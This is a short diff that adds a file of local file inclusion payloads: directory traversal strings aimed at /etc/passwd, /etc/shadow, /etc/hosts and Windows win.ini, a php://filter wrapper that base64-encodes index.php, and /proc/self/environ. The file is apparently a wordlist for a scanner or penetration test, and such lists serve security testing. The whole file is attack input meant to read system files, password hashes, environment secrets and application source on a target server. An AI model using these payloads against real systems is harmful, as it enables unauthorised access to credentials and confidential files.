@@ -1,0 +1,10 @@
+# Local File Inclusion payloads
+../../../etc/passwd
+../../windows/win.ini
+../../../../etc/passwd
+../../../../etc/hosts
+../../../../windows/win.ini
+../../../../etc/shadow
+php://filter/convert.base64-encode/resource=index.php
+/proc/self/environ
+C:\Windows\System32\drivers\etc\hosts
